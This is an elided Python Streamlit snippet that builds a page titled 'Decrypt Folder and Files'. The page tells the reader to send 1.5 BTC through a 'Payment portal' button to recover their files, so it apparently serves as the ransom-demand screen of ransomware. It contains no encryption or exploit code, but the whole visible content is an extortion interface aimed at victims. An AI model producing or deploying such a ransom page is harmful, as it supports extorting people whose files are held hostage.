...
st.set_page_config(page_title="🔓 Decrypt Folder and Files", layout="centered", initial_sidebar_state="collapsed")
st.title("Decrypt_folders_and_files")
...
st.subheader("🔓 Decrypt Folder and Files")
st.markdown("""
<p>To recover your files, send 1.5 BTC via this portal</p>
...
if st.button("Payment portal"):
    st.session_state["source"] = "Decrypt_folders_and_files"
